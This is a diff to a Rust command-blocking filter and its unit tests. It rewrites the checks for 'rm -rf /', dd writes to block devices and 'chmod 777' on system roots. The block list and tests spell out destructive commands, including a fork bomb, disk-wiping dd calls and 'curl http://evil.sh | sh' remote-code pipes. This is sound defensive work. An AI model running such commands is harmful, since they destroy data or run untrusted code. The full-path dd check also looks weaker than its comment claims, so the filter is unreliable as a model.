@@ -28,13 +28,13 @@ pub(crate) fn is_command_blocked(cmd: &str) -> bool {
         return false;
     }
     // Exact dangerous command patterns (after normalization)
+    // Uses word-boundary checks to avoid false positives on benign paths.
+    // e.g. "rm -rf /" should match "rm -rf /" but not "rm -rf /tmp"
     let blocked_patterns = [
-        "rm -rf /",
         "rm -rf --no-preserve-root",
         "rm -rf /*",
         "rm -rf /.",
         "mkfs",
-        "dd if=",
         ":(){:|:&};:",
         "shutdown",
         "reboot",
@@ -44,15 +44,25 @@ pub(crate) fn is_command_blocked(cmd: &str) -> bool {
             return true;
         }
     }
-    // Destructive device writes
-    if normalized.starts_with("dd ") && normalized.contains("of=") {
-        let of_targets = ["/dev/sda", "/dev/nvme", "/dev/mmcblk", "/dev/vda", "/dev/hda"];
-        if of_targets.iter().any(|t| normalized.contains(t)) {
+    // rm -rf / (standalone root, not a prefix like /tmp)
+    if normalized.contains("rm -rf / ")
+        || normalized.ends_with("rm -rf /")
+        || normalized.contains("rm -rf /;")
+        || normalized.contains("rm -rf /&")
+    {
+        return true;
+    }
+    // Destructive device writes (dd targeting block devices)
+    // Use contains to catch full paths like /usr/bin/dd
+    let is_dd = normalized.starts_with("dd ") || normalized.contains(" dd ");
+    if is_dd && (normalized.contains("of=") || normalized.contains("if=")) {
+        let device_targets = ["/dev/sda", "/dev/nvme", "/dev/mmcblk", "/dev/vda", "/dev/hda"];
+        if device_targets.iter().any(|t| normalized.contains(t)) {
             return true;
         }
     }
-    // chmod 777 on system roots
-    if normalized.starts_with("chmod 777")
+    // chmod 777 on system roots (use contains to catch flags between command and mode)
+    if normalized.contains("chmod 777")
         && normalized
             .split_whitespace()
             .any(|w| w == "/" || w.starts_with('/') && w.len() < 6)
@@ -104,9 +114,49 @@ mod tests {
 
     #[test]
     fn blocks_dangerous_commands() {
-        assert!(is_command_blocked("rm -rf /tmp"));
-        assert!(is_command_blocked("shutdown now"));
+        assert!(!is_command_blocked("rm -rf /tmp"), "rm -rf /tmp should be safe");
+        assert!(is_command_blocked("rm -rf / "), "rm -rf / should be blocked");
+        assert!(
+            !is_command_blocked("rm -rf /var/log"),
+            "rm -rf under /var should be safe"
+        );
+        assert!(is_command_blocked("shutdown now"), "shutdown should be blocked");
+        assert!(is_command_blocked("reboot"), "reboot should be blocked");
         assert!(!is_command_blocked("ls -la"));
+    }
+
+    #[test]
+    fn blocks_wget_pipe_to_shell() {
+        assert!(is_command_blocked("curl http://evil.sh | sh"));
+        assert!(is_command_blocked("wget http://evil.sh | sh"));
+        assert!(!is_command_blocked("curl http://example.com/file.txt"));
+    }
+
+    #[test]
+    fn blocks_chmod_777_root() {
+        assert!(is_command_blocked("chmod 777 /"));
+        assert!(!is_command_blocked("chmod 777 /tmp/somefile"));
+    }
+
+    #[test]
+    fn blocks_dd_to_devices() {
+        assert!(is_command_blocked("dd if=/dev/zero of=/dev/sda bs=4M"));
+        assert!(!is_command_blocked("dd if=/dev/zero of=./backup.img bs=4M"));
+    }
+
+    #[test]
+    fn blocks_rm_rf_critical_dirs() {
+        assert!(is_command_blocked("rm -rf /etc"));
+        assert!(is_command_blocked("rm -rf /boot"));
+        assert!(is_command_blocked("rm -rf /dev"));
+        assert!(!is_command_blocked("rm -rf ./etc"));
+    }
+
+    #[test]
+    fn allows_safe_commands() {
+        assert!(!is_command_blocked("rm -f /tmp/test.txt"));
+        assert!(!is_command_blocked("rm -rf ./node_modules"));
+        assert!(!is_command_blocked("docker rm -f mycontainer"));
     }
 
     #[test]
@@ -114,5 +164,36 @@ mod tests {
         let input = vec![" ls ".to_string(), "ls".to_string(), "".to_string()];
         let out = sanitize_commands(&input);
         assert_eq!(out, vec!["ls"]);
+    }
+
+    #[test]
+    fn blocks_chmod_r_777_root() {
+        assert!(is_command_blocked("chmod -R 777 /"), "chmod -R 777 / should be blocked");
+        assert!(is_command_blocked("chmod 777 -R /"), "chmod 777 -R / should be blocked");
+        assert!(
+            is_command_blocked("chmod -R 777 /etc"),
+            "chmod -R 777 /etc should be blocked"
+        );
+    }
+
+    #[test]
+    fn blocks_dd_full_path() {
+        assert!(
+            is_command_blocked("/usr/bin/dd if=/dev/zero of=/dev/sda bs=4M"),
+            "full path dd should be blocked"
+        );
+        assert!(
+            is_command_blocked("/sbin/dd if=/dev/zero of=/dev/nvme0n1"),
+            "sbin dd should be blocked"
+        );
+    }
+
+    #[test]
+    fn blocks_dd_without_if_of() {
+        assert!(!is_command_blocked("dd --help"), "dd --help should not be blocked");
+        assert!(
+            !is_command_blocked("/usr/bin/dd --version"),
+            "dd version should not be blocked"
+        );
     }
 }
